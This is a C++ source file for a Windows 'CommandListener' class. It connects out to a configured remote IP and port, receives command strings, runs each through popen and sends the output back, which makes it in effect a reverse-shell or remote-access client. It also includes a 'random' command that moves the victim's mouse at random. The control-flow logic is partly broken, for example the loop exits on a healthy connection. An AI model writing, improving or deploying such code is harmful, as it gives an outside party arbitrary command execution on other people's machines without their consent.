#include <string.h>
#include "CommandListener.h"
#include "RandomMouse.h"

using namespace std;

CommandListener::CommandListener()
{
  setupSocket();
}

void CommandListener::startListening()
{
  int err = connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
  if (err) {
    cout << "connect = " << err << endl;
  }
  while (1) {
    char err[8] = {0};
    int size = sizeof(err);
    int check = getsockopt(sConnect, SOL_SOCKET, SO_ERROR, err, &size);
    int e;
    memcpy(&e, err, sizeof(int));
    cout << "err outside = " << e << endl;
    if (!e) {
      cout << "err = " << e << endl;
      break;
    }
    memset(message, 0, sizeof(message));
    r = recv(sConnect, message, sizeof(message), 0);
    if (r < 0)
      cout << "Recv fails" << endl;
    else
      cout << message << endl;
      handleCommand(message);
  }
  closesocket(sConnect);
  getchar();
}

void CommandListener::setupSocket()
{
  //Winsock-DLL
  WSAData wsaData;
  WORD DLLVersion;
  DLLVersion = MAKEWORD(2,1);
  r = WSAStartup(DLLVersion, &wsaData);
  // Socket configuration
  sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  addr.sin_addr.s_addr = inet_addr(IP_ADDR);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(PORT_NUM);
}

void CommandListener::handleCommand(const char* cmd)
{
  if(strcmp(cmd, "stop") == 0)
  {
    StopAllThreads sat;
    sat();
    // TO-DO exit the program
  }
  else if(strcmp(cmd, "random") == 0)
  {
    RandomMouse rdm;
    this->tp.setThread(&rdm);
  }
  else
  {
    string str = executeCommand(message);
    char *sendbuf = &str[0];
    send(sConnect,sendbuf,(int)strlen(sendbuf),0);
  }
  char done[30] = "Command executed.\n";
  send(sConnect,done,(int)strlen(done),0);
}

string CommandListener::executeCommand(const char* cmd)
{
  array<char, 128> buffer;
  string result;
  unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
  if (!pipe) {
    throw runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }
  return result;
}